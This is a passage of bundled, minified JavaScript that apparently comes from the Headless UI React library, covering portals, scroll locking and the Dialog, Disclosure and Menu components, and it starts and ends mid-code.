    r = Jn(e),
    [l, a] = p.useState(() => {
      if ((!t && n !== null) || wt.isServer) return null;
      let o = r == null ? void 0 : r.getElementById("headlessui-portal-root");
      if (o) return o;
      if (r === null) return null;
      let i = r.createElement("div");
      return (
        i.setAttribute("id", "headlessui-portal-root"), r.body.appendChild(i)
      );
    });
  return (
    p.useEffect(() => {
      l !== null &&
        ((r != null && r.body.contains(l)) ||
          r == null ||
          r.body.appendChild(l));
    }, [l, r]),
    p.useEffect(() => {
      t || (n !== null && a(n.current));
    }, [n, a, t]),
    l
  );
}
let C1 = p.Fragment;
function P1(e, t) {
  let n = e,
    r = p.useRef(null),
    l = q(
      nf((d) => {
        r.current = d;
      }),
      t
    ),
    a = Jn(r),
    o = N1(r),
    [i] = p.useState(() => {
      var d;
      return wt.isServer
        ? null
        : (d = a == null ? void 0 : a.createElement("div")) != null
        ? d
        : null;
    }),
    s = p.useContext(ni),
    u = Xn();
  return (
    te(() => {
      !o ||
        !i ||
        o.contains(i) ||
        (i.setAttribute("data-headlessui-portal", ""), o.appendChild(i));
    }, [o, i]),
    te(() => {
      if (i && s) return s.register(i);
    }, [s, i]),
    of(() => {
      var d;
      !o ||
        !i ||
        (i instanceof Node && o.contains(i) && o.removeChild(i),
        o.childNodes.length <= 0 &&
          ((d = o.parentElement) == null || d.removeChild(o)));
    }),
    u
      ? !o || !i
        ? null
        : Gd.createPortal(
            G({
              ourProps: { ref: l },
              theirProps: n,
              defaultTag: C1,
              name: "Portal",
            }),
            i
          )
      : null
  );
}
let T1 = p.Fragment,
  ff = p.createContext(null);
function L1(e, t) {
  let { target: n, ...r } = e,
    l = { ref: q(t) };
  return $.createElement(
    ff.Provider,
    { value: n },
    G({ ourProps: l, theirProps: r, defaultTag: T1, name: "Popover.Group" })
  );
}
let ni = p.createContext(null);
function j1() {
  let e = p.useContext(ni),
    t = p.useRef([]),
    n = _((a) => (t.current.push(a), e && e.register(a), () => r(a))),
    r = _((a) => {
      let o = t.current.indexOf(a);
      o !== -1 && t.current.splice(o, 1), e && e.unregister(a);
    }),
    l = p.useMemo(
      () => ({ register: n, unregister: r, portals: t }),
      [n, r, t]
    );
  return [
    t,
    p.useMemo(
      () =>
        function ({ children: a }) {
          return $.createElement(ni.Provider, { value: l }, a);
        },
      [l]
    ),
  ];
}
let $1 = K(P1),
  _1 = K(L1),
  ri = Object.assign($1, { Group: _1 });
function F1(e, t) {
  return (e === t && (e !== 0 || 1 / e === 1 / t)) || (e !== e && t !== t);
}
const R1 = typeof Object.is == "function" ? Object.is : F1,
  { useState: I1, useEffect: M1, useLayoutEffect: D1, useDebugValue: O1 } = Nr;
function z1(e, t, n) {
  const r = t(),
    [{ inst: l }, a] = I1({ inst: { value: r, getSnapshot: t } });
  return (
    D1(() => {
      (l.value = r), (l.getSnapshot = t), eo(l) && a({ inst: l });
    }, [e, r, t]),
    M1(
      () => (
        eo(l) && a({ inst: l }),
        e(() => {
          eo(l) && a({ inst: l });
        })
      ),
      [e]
    ),
    O1(r),
    r
  );
}
function eo(e) {
  const t = e.getSnapshot,
    n = e.value;
  try {
    const r = t();
    return !R1(n, r);
  } catch {
    return !0;
  }
}
function A1(e, t, n) {
  return t();
}
const W1 =
    typeof window < "u" &&
    typeof window.document < "u" &&
    typeof window.document.createElement < "u",
  U1 = !W1,
  B1 = U1 ? A1 : z1,
  H1 = "useSyncExternalStore" in Nr ? ((e) => e.useSyncExternalStore)(Nr) : B1;
function V1(e) {
  return H1(e.subscribe, e.getSnapshot, e.getSnapshot);
}
function Q1(e, t) {
  let n = e(),
    r = new Set();
  return {
    getSnapshot() {
      return n;
    },
    subscribe(l) {
      return r.add(l), () => r.delete(l);
    },
    dispatch(l, ...a) {
      let o = t[l].call(n, ...a);
      o && ((n = o), r.forEach((i) => i()));
    },
  };
}
function K1() {
  let e;
  return {
    before({ doc: t }) {
      var n;
      let r = t.documentElement;
      e = ((n = t.defaultView) != null ? n : window).innerWidth - r.clientWidth;
    },
    after({ doc: t, d: n }) {
      let r = t.documentElement,
        l = r.clientWidth - r.offsetWidth,
        a = e - l;
      n.style(r, "paddingRight", `${a}px`);
    },
  };
}
function Y1() {
  return Jd()
    ? {
        before({ doc: e, d: t, meta: n }) {
          function r(l) {
            return n.containers.flatMap((a) => a()).some((a) => a.contains(l));
          }
          t.microTask(() => {
            var l;
            if (
              window.getComputedStyle(e.documentElement).scrollBehavior !==
              "auto"
            ) {
              let i = at();
              i.style(e.documentElement, "scrollBehavior", "auto"),
                t.add(() => t.microTask(() => i.dispose()));
            }
            let a = (l = window.scrollY) != null ? l : window.pageYOffset,
              o = null;
            t.addEventListener(
              e,
              "click",
              (i) => {
                if (i.target instanceof HTMLElement)
                  try {
                    let s = i.target.closest("a");
                    if (!s) return;
                    let { hash: u } = new URL(s.href),
                      d = e.querySelector(u);
                    d && !r(d) && (o = d);
                  } catch {}
              },
              !0
            ),
              t.addEventListener(e, "touchstart", (i) => {
                if (i.target instanceof HTMLElement)
                  if (r(i.target)) {
                    let s = i.target;
                    for (; s.parentElement && r(s.parentElement); )
                      s = s.parentElement;
                    t.style(s, "overscrollBehavior", "contain");
                  } else t.style(i.target, "touchAction", "none");
              }),
              t.addEventListener(
                e,
                "touchmove",
                (i) => {
                  if (i.target instanceof HTMLElement)
                    if (r(i.target)) {
                      let s = i.target;
                      for (
                        ;
                        s.parentElement &&
                        s.dataset.headlessuiPortal !== "" &&
                        !(
                          s.scrollHeight > s.clientHeight ||
                          s.scrollWidth > s.clientWidth
                        );

                      )
                        s = s.parentElement;
                      s.dataset.headlessuiPortal === "" && i.preventDefault();
                    } else i.preventDefault();
                },
                { passive: !1 }
              ),
              t.add(() => {
                var i;
                let s = (i = window.scrollY) != null ? i : window.pageYOffset;
                a !== s && window.scrollTo(0, a),
                  o &&
                    o.isConnected &&
                    (o.scrollIntoView({ block: "nearest" }), (o = null));
              });
          });
        },
      }
    : {};
}
function G1() {
  return {
    before({ doc: e, d: t }) {
      t.style(e.documentElement, "overflow", "hidden");
    },
  };
}
function X1(e) {
  let t = {};
  for (let n of e) Object.assign(t, n(t));
  return t;
}
let an = Q1(() => new Map(), {
  PUSH(e, t) {
    var n;
    let r =
      (n = this.get(e)) != null
        ? n
        : { doc: e, count: 0, d: at(), meta: new Set() };
    return r.count++, r.meta.add(t), this.set(e, r), this;
  },
  POP(e, t) {
    let n = this.get(e);
    return n && (n.count--, n.meta.delete(t)), this;
  },
  SCROLL_PREVENT({ doc: e, d: t, meta: n }) {
    let r = { doc: e, d: t, meta: X1(n) },
      l = [Y1(), K1(), G1()];
    l.forEach(({ before: a }) => (a == null ? void 0 : a(r))),
      l.forEach(({ after: a }) => (a == null ? void 0 : a(r)));
  },
  SCROLL_ALLOW({ d: e }) {
    e.dispose();
  },
  TEARDOWN({ doc: e }) {
    this.delete(e);
  },
});
an.subscribe(() => {
  let e = an.getSnapshot(),
    t = new Map();
  for (let [n] of e) t.set(n, n.documentElement.style.overflow);
  for (let n of e.values()) {
    let r = t.get(n.doc) === "hidden",
      l = n.count !== 0;
    ((l && !r) || (!l && r)) &&
      an.dispatch(n.count > 0 ? "SCROLL_PREVENT" : "SCROLL_ALLOW", n),
      n.count === 0 && an.dispatch("TEARDOWN", n);
  }
});
function Z1(e, t, n) {
  let r = V1(an),
    l = e ? r.get(e) : void 0,
    a = l ? l.count > 0 : !1;
  return (
    te(() => {
      if (!(!e || !t))
        return an.dispatch("PUSH", e, n), () => an.dispatch("POP", e, n);
    }, [t, e]),
    a
  );
}
let to = new Map(),
  ur = new Map();
function $u(e, t = !0) {
  te(() => {
    var n;
    if (!t) return;
    let r = typeof e == "function" ? e() : e.current;
    if (!r) return;
    function l() {
      var o;
      if (!r) return;
      let i = (o = ur.get(r)) != null ? o : 1;
      if ((i === 1 ? ur.delete(r) : ur.set(r, i - 1), i !== 1)) return;
      let s = to.get(r);
      s &&
        (s["aria-hidden"] === null
          ? r.removeAttribute("aria-hidden")
          : r.setAttribute("aria-hidden", s["aria-hidden"]),
        (r.inert = s.inert),
        to.delete(r));
    }
    let a = (n = ur.get(r)) != null ? n : 0;
    return (
      ur.set(r, a + 1),
      a !== 0 ||
        (to.set(r, {
          "aria-hidden": r.getAttribute("aria-hidden"),
          inert: r.inert,
        }),
        r.setAttribute("aria-hidden", "true"),
        (r.inert = !0)),
      l
    );
  }, [e, t]);
}
function J1({
  defaultContainers: e = [],
  portals: t,
  mainTreeNodeRef: n,
} = {}) {
  var r;
  let l = p.useRef((r = n == null ? void 0 : n.current) != null ? r : null),
    a = Jn(l),
    o = _(() => {
      var i, s, u;
      let d = [];
      for (let v of e)
        v !== null &&
          (v instanceof HTMLElement
            ? d.push(v)
            : "current" in v &&
              v.current instanceof HTMLElement &&
              d.push(v.current));
      if (t != null && t.current) for (let v of t.current) d.push(v);
      for (let v of (i =
        a == null ? void 0 : a.querySelectorAll("html > *, body > *")) != null
        ? i
        : [])
        v !== document.body &&
          v !== document.head &&
          v instanceof HTMLElement &&
          v.id !== "headlessui-portal-root" &&
          (v.contains(l.current) ||
            v.contains(
              (u = (s = l.current) == null ? void 0 : s.getRootNode()) == null
                ? void 0
                : u.host
            ) ||
            d.some((g) => v.contains(g)) ||
            d.push(v));
      return d;
    });
  return {
    resolveContainers: o,
    contains: _((i) => o().some((s) => s.contains(i))),
    mainTreeNodeRef: l,
    MainTreeNode: p.useMemo(
      () =>
        function () {
          return n != null
            ? null
            : $.createElement(Hr, { features: Br.Hidden, ref: l });
        },
      [l, n]
    ),
  };
}
let ss = p.createContext(() => {});
ss.displayName = "StackContext";
var li = ((e) => ((e[(e.Add = 0)] = "Add"), (e[(e.Remove = 1)] = "Remove"), e))(
  li || {}
);
function q1() {
  return p.useContext(ss);
}
function e0({ children: e, onUpdate: t, type: n, element: r, enabled: l }) {
  let a = q1(),
    o = _((...i) => {
      t == null || t(...i), a(...i);
    });
  return (
    te(() => {
      let i = l === void 0 || l === !0;
      return (
        i && o(0, n, r),
        () => {
          i && o(1, n, r);
        }
      );
    }, [o, n, r, l]),
    $.createElement(ss.Provider, { value: o }, e)
  );
}
let pf = p.createContext(null);
function mf() {
  let e = p.useContext(pf);
  if (e === null) {
    let t = new Error(
      "You used a <Description /> component, but it is not inside a relevant parent."
    );
    throw (Error.captureStackTrace && Error.captureStackTrace(t, mf), t);
  }
  return e;
}
function t0() {
  let [e, t] = p.useState([]);
  return [
    e.length > 0 ? e.join(" ") : void 0,
    p.useMemo(
      () =>
        function (n) {
          let r = _(
              (a) => (
                t((o) => [...o, a]),
                () =>
                  t((o) => {
                    let i = o.slice(),
                      s = i.indexOf(a);
                    return s !== -1 && i.splice(s, 1), i;
                  })
              )
            ),
            l = p.useMemo(
              () => ({
                register: r,
                slot: n.slot,
                name: n.name,
                props: n.props,
              }),
              [r, n.slot, n.name, n.props]
            );
          return $.createElement(pf.Provider, { value: l }, n.children);
        },
      [t]
    ),
  ];
}
let n0 = "p";
function r0(e, t) {
  let n = Oe(),
    { id: r = `headlessui-description-${n}`, ...l } = e,
    a = mf(),
    o = q(t);
  te(() => a.register(r), [r, a.register]);
  let i = { ref: o, ...a.props, id: r };
  return G({
    ourProps: i,
    theirProps: l,
    slot: a.slot || {},
    defaultTag: n0,
    name: a.name || "Description",
  });
}
let l0 = K(r0),
  a0 = Object.assign(l0, {});
var o0 = ((e) => (
    (e[(e.Open = 0)] = "Open"), (e[(e.Closed = 1)] = "Closed"), e
  ))(o0 || {}),
  i0 = ((e) => ((e[(e.SetTitleId = 0)] = "SetTitleId"), e))(i0 || {});
let s0 = {
    0(e, t) {
      return e.titleId === t.id ? e : { ...e, titleId: t.id };
    },
  },
  la = p.createContext(null);
la.displayName = "DialogContext";
function qr(e) {
  let t = p.useContext(la);
  if (t === null) {
    let n = new Error(`<${e} /> is missing a parent <Dialog /> component.`);
    throw (Error.captureStackTrace && Error.captureStackTrace(n, qr), n);
  }
  return t;
}
function u0(e, t, n = () => [document.body]) {
  Z1(e, t, (r) => {
    var l;
    return { containers: [...((l = r.containers) != null ? l : []), n] };
  });
}
function c0(e, t) {
  return H(t.type, s0, e, t);
}
let d0 = "div",
  f0 = dt.RenderStrategy | dt.Static;
function p0(e, t) {
  let n = Oe(),
    {
      id: r = `headlessui-dialog-${n}`,
      open: l,
      onClose: a,
      initialFocus: o,
      role: i = "dialog",
      __demoMode: s = !1,
      ...u
    } = e,
    [d, v] = p.useState(0),
    g = p.useRef(!1);
  i = (function () {
    return i === "dialog" || i === "alertdialog"
      ? i
      : (g.current ||
          ((g.current = !0),
          console.warn(
            `Invalid role [${i}] passed to <Dialog />. Only \`dialog\` and and \`alertdialog\` are supported. Using \`dialog\` instead.`
          )),
        "dialog");
  })();
  let y = Jr();
  l === void 0 && y !== null && (l = (y & re.Open) === re.Open);
  let w = p.useRef(null),
    x = q(w, t),
    k = Jn(w),
    m = e.hasOwnProperty("open") || y !== null,
    c = e.hasOwnProperty("onClose");
  if (!m && !c)
    throw new Error(
      "You have to provide an `open` and an `onClose` prop to the `Dialog` component."
    );
  if (!m)
    throw new Error(
      "You provided an `onClose` prop to the `Dialog`, but forgot an `open` prop."
    );
  if (!c)
    throw new Error(
      "You provided an `open` prop to the `Dialog`, but forgot an `onClose` prop."
    );
  if (typeof l != "boolean")
    throw new Error(
      `You provided an \`open\` prop to the \`Dialog\`, but the value is not a boolean. Received: ${l}`
    );
  if (typeof a != "function")
    throw new Error(
      `You provided an \`onClose\` prop to the \`Dialog\`, but the value is not a function. Received: ${a}`
    );
  let h = l ? 0 : 1,
    [b, S] = p.useReducer(c0, {
      titleId: null,
      descriptionId: null,
      panelRef: p.createRef(),
    }),
    N = _(() => a(!1)),
    P = _((le) => S({ type: 0, id: le })),
    C = Xn() ? (s ? !1 : h === 0) : !1,
    I = d > 1,
    T = p.useContext(la) !== null,
    [A, fe] = j1(),
    je = {
      get current() {
        var le;
        return (le = b.panelRef.current) != null ? le : w.current;
      },
    },
    {
      resolveContainers: Ke,
      mainTreeNodeRef: Ye,
      MainTreeNode: Gt,
    } = J1({ portals: A, defaultContainers: [je] }),
    Ge = I ? "parent" : "leaf",
    L = y !== null ? (y & re.Closing) === re.Closing : !1,
    F = T || L ? !1 : C,
    R = p.useCallback(() => {
      var le, pt;
      return (pt = Array.from(
        (le = k == null ? void 0 : k.querySelectorAll("body > *")) != null
          ? le
          : []
      ).find((ze) =>
        ze.id === "headlessui-portal-root"
          ? !1
          : ze.contains(Ye.current) && ze instanceof HTMLElement
      )) != null
        ? pt
        : null;
    }, [Ye]);
  $u(R, F);
  let W = I ? !0 : C,
    U = p.useCallback(() => {
      var le, pt;
      return (pt = Array.from(
        (le =
          k == null
            ? void 0
            : k.querySelectorAll("[data-headlessui-portal]")) != null
          ? le
          : []
      ).find((ze) => ze.contains(Ye.current) && ze instanceof HTMLElement)) !=
        null
        ? pt
        : null;
    }, [Ye]);
  $u(U, W), ef(Ke, N, !(!C || I));
  let ue = !(I || h !== 0);
  af(k == null ? void 0 : k.defaultView, "keydown", (le) => {
    ue &&
      (le.defaultPrevented ||
        (le.key === D.Escape &&
          (le.preventDefault(), le.stopPropagation(), N())));
  }),
    u0(k, !(L || h !== 0 || T), Ke),
    p.useEffect(() => {
      if (h !== 0 || !w.current) return;
      let le = new ResizeObserver((pt) => {
        for (let ze of pt) {
          let tl = ze.target.getBoundingClientRect();
          tl.x === 0 && tl.y === 0 && tl.width === 0 && tl.height === 0 && N();
        }
      });
      return le.observe(w.current), () => le.disconnect();
    }, [h, w, N]);
  let [ft, gn] = t0(),
    bf = p.useMemo(
      () => [{ dialogState: h, close: N, setTitleId: P }, b],
      [h, b, N, P]
    ),
    gs = p.useMemo(() => ({ open: h === 0 }), [h]),
    kf = {
      ref: x,
      id: r,
      role: i,
      "aria-modal": h === 0 ? !0 : void 0,
      "aria-labelledby": b.titleId,
      "aria-describedby": ft,
    };
  return $.createElement(
    e0,
    {
      type: "Dialog",
      enabled: h === 0,
      element: w,
      onUpdate: _((le, pt) => {
        pt === "Dialog" &&
          H(le, {
            [li.Add]: () => v((ze) => ze + 1),
            [li.Remove]: () => v((ze) => ze - 1),
          });
      }),
    },
    $.createElement(
      ti,
      { force: !0 },
      $.createElement(
        ri,
        null,
        $.createElement(
          la.Provider,
          { value: bf },
          $.createElement(
            ri.Group,
            { target: w },
            $.createElement(
              ti,
              { force: !1 },
              $.createElement(
                gn,
                { slot: gs, name: "Dialog.Description" },
                $.createElement(
                  sr,
                  {
                    initialFocus: o,
                    containers: Ke,
                    features: C
                      ? H(Ge, {
                          parent: sr.features.RestoreFocus,
                          leaf: sr.features.All & ~sr.features.FocusLock,
                        })
                      : sr.features.None,
                  },
                  $.createElement(
                    fe,
                    null,
                    G({
                      ourProps: kf,
                      theirProps: u,
                      slot: gs,
                      defaultTag: d0,
                      features: f0,
                      visible: h === 0,
                      name: "Dialog",
                    })
                  )
                )
              )
            )
          )
        )
      )
    ),
    $.createElement(Gt, null)
  );
}
let m0 = "div";
function h0(e, t) {
  let n = Oe(),
    { id: r = `headlessui-dialog-overlay-${n}`, ...l } = e,
    [{ dialogState: a, close: o }] = qr("Dialog.Overlay"),
    i = q(t),
    s = _((d) => {
      if (d.target === d.currentTarget) {
        if (is(d.currentTarget)) return d.preventDefault();
        d.preventDefault(), d.stopPropagation(), o();
      }
    }),
    u = p.useMemo(() => ({ open: a === 0 }), [a]);
  return G({
    ourProps: { ref: i, id: r, "aria-hidden": !0, onClick: s },
    theirProps: l,
    slot: u,
    defaultTag: m0,
    name: "Dialog.Overlay",
  });
}
let v0 = "div";
function g0(e, t) {
  let n = Oe(),
    { id: r = `headlessui-dialog-backdrop-${n}`, ...l } = e,
    [{ dialogState: a }, o] = qr("Dialog.Backdrop"),
    i = q(t);
  p.useEffect(() => {
    if (o.panelRef.current === null)
      throw new Error(
        "A <Dialog.Backdrop /> component is being used, but a <Dialog.Panel /> component is missing."
      );
  }, [o.panelRef]);
  let s = p.useMemo(() => ({ open: a === 0 }), [a]);
  return $.createElement(
    ti,
    { force: !0 },
    $.createElement(
      ri,
      null,
      G({
        ourProps: { ref: i, id: r, "aria-hidden": !0 },
        theirProps: l,
        slot: s,
        defaultTag: v0,
        name: "Dialog.Backdrop",
      })
    )
  );
}
let y0 = "div";
function w0(e, t) {
  let n = Oe(),
    { id: r = `headlessui-dialog-panel-${n}`, ...l } = e,
    [{ dialogState: a }, o] = qr("Dialog.Panel"),
    i = q(t, o.panelRef),
    s = p.useMemo(() => ({ open: a === 0 }), [a]),
    u = _((d) => {
      d.stopPropagation();
    });
  return G({
    ourProps: { ref: i, id: r, onClick: u },
    theirProps: l,
    slot: s,
    defaultTag: y0,
    name: "Dialog.Panel",
  });
}
let x0 = "h2";
function b0(e, t) {
  let n = Oe(),
    { id: r = `headlessui-dialog-title-${n}`, ...l } = e,
    [{ dialogState: a, setTitleId: o }] = qr("Dialog.Title"),
    i = q(t);
  p.useEffect(() => (o(r), () => o(null)), [r, o]);
  let s = p.useMemo(() => ({ open: a === 0 }), [a]);
  return G({
    ourProps: { ref: i, id: r },
    theirProps: l,
    slot: s,
    defaultTag: x0,
    name: "Dialog.Title",
  });
}
let k0 = K(p0),
  S0 = K(g0),
  E0 = K(w0),
  N0 = K(h0),
  C0 = K(b0),
  Re = Object.assign(k0, {
    Backdrop: S0,
    Panel: E0,
    Overlay: N0,
    Title: C0,
    Description: a0,
  });
var _u;
let P0 =
  (_u = $.startTransition) != null
    ? _u
    : function (e) {
        e();
      };
var T0 = ((e) => (
    (e[(e.Open = 0)] = "Open"), (e[(e.Closed = 1)] = "Closed"), e
  ))(T0 || {}),
  L0 = ((e) => (
    (e[(e.ToggleDisclosure = 0)] = "ToggleDisclosure"),
    (e[(e.CloseDisclosure = 1)] = "CloseDisclosure"),
    (e[(e.SetButtonId = 2)] = "SetButtonId"),
    (e[(e.SetPanelId = 3)] = "SetPanelId"),
    (e[(e.LinkPanel = 4)] = "LinkPanel"),
    (e[(e.UnlinkPanel = 5)] = "UnlinkPanel"),
    e
  ))(L0 || {});
let j0 = {
    0: (e) => ({ ...e, disclosureState: H(e.disclosureState, { 0: 1, 1: 0 }) }),
    1: (e) => (e.disclosureState === 1 ? e : { ...e, disclosureState: 1 }),
    4(e) {
      return e.linkedPanel === !0 ? e : { ...e, linkedPanel: !0 };
    },
    5(e) {
      return e.linkedPanel === !1 ? e : { ...e, linkedPanel: !1 };
    },
    2(e, t) {
      return e.buttonId === t.buttonId ? e : { ...e, buttonId: t.buttonId };
    },
    3(e, t) {
      return e.panelId === t.panelId ? e : { ...e, panelId: t.panelId };
    },
  },
  us = p.createContext(null);
us.displayName = "DisclosureContext";
function cs(e) {
  let t = p.useContext(us);
  if (t === null) {
    let n = new Error(`<${e} /> is missing a parent <Disclosure /> component.`);
    throw (Error.captureStackTrace && Error.captureStackTrace(n, cs), n);
  }
  return t;
}
let ds = p.createContext(null);
ds.displayName = "DisclosureAPIContext";
function hf(e) {
  let t = p.useContext(ds);
  if (t === null) {
    let n = new Error(`<${e} /> is missing a parent <Disclosure /> component.`);
    throw (Error.captureStackTrace && Error.captureStackTrace(n, hf), n);
  }
  return t;
}
let fs = p.createContext(null);
fs.displayName = "DisclosurePanelContext";
function $0() {
  return p.useContext(fs);
}
function _0(e, t) {
  return H(t.type, j0, e, t);
}
let F0 = p.Fragment;
function R0(e, t) {
  let { defaultOpen: n = !1, ...r } = e,
    l = p.useRef(null),
    a = q(
      t,
      nf((k) => {
        l.current = k;
      }, e.as === void 0 || e.as === p.Fragment)
    ),
    o = p.useRef(null),
    i = p.useRef(null),
    s = p.useReducer(_0, {
      disclosureState: n ? 0 : 1,
      linkedPanel: !1,
      buttonRef: i,
      panelRef: o,
      buttonId: null,
      panelId: null,
    }),
    [{ disclosureState: u, buttonId: d }, v] = s,
    g = _((k) => {
      v({ type: 1 });
      let m = Zn(l);
      if (!m || !d) return;
      let c = k
        ? k instanceof HTMLElement
          ? k
          : k.current instanceof HTMLElement
          ? k.current
          : m.getElementById(d)
        : m.getElementById(d);
      c == null || c.focus();
    }),
    y = p.useMemo(() => ({ close: g }), [g]),
    w = p.useMemo(() => ({ open: u === 0, close: g }), [u, g]),
    x = { ref: a };
  return $.createElement(
    us.Provider,
    { value: s },
    $.createElement(
      ds.Provider,
      { value: y },
      $.createElement(
        os,
        { value: H(u, { 0: re.Open, 1: re.Closed }) },
        G({
          ourProps: x,
          theirProps: r,
          slot: w,
          defaultTag: F0,
          name: "Disclosure",
        })
      )
    )
  );
}
let I0 = "button";
function M0(e, t) {
  let n = Oe(),
    { id: r = `headlessui-disclosure-button-${n}`, ...l } = e,
    [a, o] = cs("Disclosure.Button"),
    i = $0(),
    s = i === null ? !1 : i === a.panelId,
    u = p.useRef(null),
    d = q(u, t, s ? null : a.buttonRef),
    v = rf();
  p.useEffect(() => {
    if (!s)
      return (
        o({ type: 2, buttonId: r }),
        () => {
          o({ type: 2, buttonId: null });
        }
      );
  }, [r, o, s]);
  let g = _((c) => {
      var h;
      if (s) {
        if (a.disclosureState === 1) return;
        switch (c.key) {
          case D.Space:
          case D.Enter:
            c.preventDefault(),
              c.stopPropagation(),
              o({ type: 0 }),
              (h = a.buttonRef.current) == null || h.focus();
            break;
        }
      } else
        switch (c.key) {
          case D.Space:
          case D.Enter:
            c.preventDefault(), c.stopPropagation(), o({ type: 0 });
            break;
        }
    }),
    y = _((c) => {
      switch (c.key) {
        case D.Space:
          c.preventDefault();
          break;
      }
    }),
    w = _((c) => {
      var h;
      is(c.currentTarget) ||
        e.disabled ||
        (s
          ? (o({ type: 0 }), (h = a.buttonRef.current) == null || h.focus())
          : o({ type: 0 }));
    }),
    x = p.useMemo(() => ({ open: a.disclosureState === 0 }), [a]),
    k = rs(e, u),
    m = s
      ? { ref: d, type: k, onKeyDown: g, onClick: w }
      : {
          ref: d,
          id: r,
          type: k,
          "aria-expanded": a.disclosureState === 0,
          "aria-controls": a.linkedPanel ? a.panelId : void 0,
          onKeyDown: g,
          onKeyUp: y,
          onClick: w,
        };
  return G({
    mergeRefs: v,
    ourProps: m,
    theirProps: l,
    slot: x,
    defaultTag: I0,
    name: "Disclosure.Button",
  });
}
let D0 = "div",
  O0 = dt.RenderStrategy | dt.Static;
function z0(e, t) {
  let n = Oe(),
    { id: r = `headlessui-disclosure-panel-${n}`, ...l } = e,
    [a, o] = cs("Disclosure.Panel"),
    { close: i } = hf("Disclosure.Panel"),
    s = rf(),
    u = q(t, a.panelRef, (w) => {
      P0(() => o({ type: w ? 4 : 5 }));
    });
  p.useEffect(
    () => (
      o({ type: 3, panelId: r }),
      () => {
        o({ type: 3, panelId: null });
      }
    ),
    [r, o]
  );
  let d = Jr(),
    v = d !== null ? (d & re.Open) === re.Open : a.disclosureState === 0,
    g = p.useMemo(() => ({ open: a.disclosureState === 0, close: i }), [a, i]),
    y = { ref: u, id: r };
  return $.createElement(
    fs.Provider,
    { value: a.panelId },
    G({
      mergeRefs: s,
      ourProps: y,
      theirProps: l,
      slot: g,
      defaultTag: D0,
      features: O0,
      visible: v,
      name: "Disclosure.Panel",
    })
  );
}
let A0 = K(R0),
  W0 = K(M0),
  U0 = K(z0),
  no = Object.assign(A0, { Button: W0, Panel: U0 }),
  Fu =
    /([\u2700-\u27BF]|[\uE000-\uF8FF]|\uD83C[\uDC00-\uDFFF]|\uD83D[\uDC00-\uDFFF]|[\u2011-\u26FF]|\uD83E[\uDD10-\uDDFF])/g;
function Ru(e) {
  var t, n;
  let r = (t = e.innerText) != null ? t : "",
    l = e.cloneNode(!0);
  if (!(l instanceof HTMLElement)) return r;
  let a = !1;
  for (let i of l.querySelectorAll('[hidden],[aria-hidden],[role="img"]'))
    i.remove(), (a = !0);
  let o = a ? ((n = l.innerText) != null ? n : "") : r;
  return Fu.test(o) && (o = o.replace(Fu, "")), o;
}
function B0(e) {
  let t = e.getAttribute("aria-label");
  if (typeof t == "string") return t.trim();
  let n = e.getAttribute("aria-labelledby");
  if (n) {
    let r = n
      .split(" ")
      .map((l) => {
        let a = document.getElementById(l);
        if (a) {
          let o = a.getAttribute("aria-label");
          return typeof o == "string" ? o.trim() : Ru(a).trim();
        }
        return null;
      })
      .filter(Boolean);
    if (r.length > 0) return r.join(", ");
  }
  return Ru(e).trim();
}
function H0(e) {
  let t = p.useRef(""),
    n = p.useRef("");
  return _(() => {
    let r = e.current;
    if (!r) return "";
    let l = r.innerText;
    if (t.current === l) return n.current;
    let a = B0(r).trim().toLowerCase();
    return (t.current = l), (n.current = a), a;
  });
}
var V0 = ((e) => (
    (e[(e.Open = 0)] = "Open"), (e[(e.Closed = 1)] = "Closed"), e
  ))(V0 || {}),
  Q0 = ((e) => (
    (e[(e.Pointer = 0)] = "Pointer"), (e[(e.Other = 1)] = "Other"), e
  ))(Q0 || {}),
  K0 = ((e) => (
    (e[(e.OpenMenu = 0)] = "OpenMenu"),
    (e[(e.CloseMenu = 1)] = "CloseMenu"),
    (e[(e.GoToItem = 2)] = "GoToItem"),
    (e[(e.Search = 3)] = "Search"),
    (e[(e.ClearSearch = 4)] = "ClearSearch"),
    (e[(e.RegisterItem = 5)] = "RegisterItem"),
    (e[(e.UnregisterItem = 6)] = "UnregisterItem"),
    e
  ))(K0 || {});
function ro(e, t = (n) => n) {
  let n = e.activeItemIndex !== null ? e.items[e.activeItemIndex] : null,
    r = ln(t(e.items.slice()), (a) => a.dataRef.current.domRef.current),
    l = n ? r.indexOf(n) : null;
  return l === -1 && (l = null), { items: r, activeItemIndex: l };
}
let Y0 = {
    1(e) {
      return e.menuState === 1
        ? e
        : { ...e, activeItemIndex: null, menuState: 1 };
    },
    0(e) {
      return e.menuState === 0 ? e : { ...e, __demoMode: !1, menuState: 0 };
    },
    2: (e, t) => {
      var n;
      let r = ro(e),
        l = h1(t, {
          resolveItems: () => r.items,
          resolveActiveIndex: () => r.activeItemIndex,
          resolveId: (a) => a.id,
          resolveDisabled: (a) => a.dataRef.current.disabled,
        });
      return {
        ...e,
        ...r,
        searchQuery: "",
        activeItemIndex: l,
        activationTrigger: (n = t.trigger) != null ? n : 1,
      };
    },
    3: (e, t) => {
      let n = e.searchQuery !== "" ? 0 : 1,
        r = e.searchQuery + t.value.toLowerCase(),
        l = (
          e.activeItemIndex !== null
            ? e.items
                .slice(e.activeItemIndex + n)
                .concat(e.items.slice(0, e.activeItemIndex + n))
            : e.items
        ).find((o) => {
          var i;
          return (
            ((i = o.dataRef.current.textValue) == null
              ? void 0
              : i.startsWith(r)) && !o.dataRef.current.disabled
          );
        }),
        a = l ? e.items.indexOf(l) : -1;
      return a === -1 || a === e.activeItemIndex
        ? { ...e, searchQuery: r }
        : { ...e, searchQuery: r, activeItemIndex: a, activationTrigger: 1 };
    },
    4(e) {
      return e.searchQuery === ""
        ? e
        : { ...e, searchQuery: "", searchActiveItemIndex: null };
    },
    5: (e, t) => {
      let n = ro(e, (r) => [...r, { id: t.id, dataRef: t.dataRef }]);
      return { ...e, ...n };
    },
    6: (e, t) => {
      let n = ro(e, (r) => {
        let l = r.findIndex((a) => a.id === t.id);
        return l !== -1 && r.splice(l, 1), r;
      });
      return { ...e, ...n, activationTrigger: 1 };
    },
  },
  ps = p.createContext(null);
ps.displayName = "MenuContext";
function ka(e) {
  let t = p.useContext(ps);
  if (t === null) {
    let n = new Error(`<${e} /> is missing a parent <Menu /> component.`);
    throw (Error.captureStackTrace && Error.captureStackTrace(n, ka), n);
  }
  return t;
}
function G0(e, t) {
  return H(t.type, Y0, e, t);
}
let X0 = p.Fragment;
function Z0(e, t) {
  let { __demoMode: n = !1, ...r } = e,
    l = p.useReducer(G0, {
      __demoMode: n,
      menuState: n ? 0 : 1,
      buttonRef: p.createRef(),
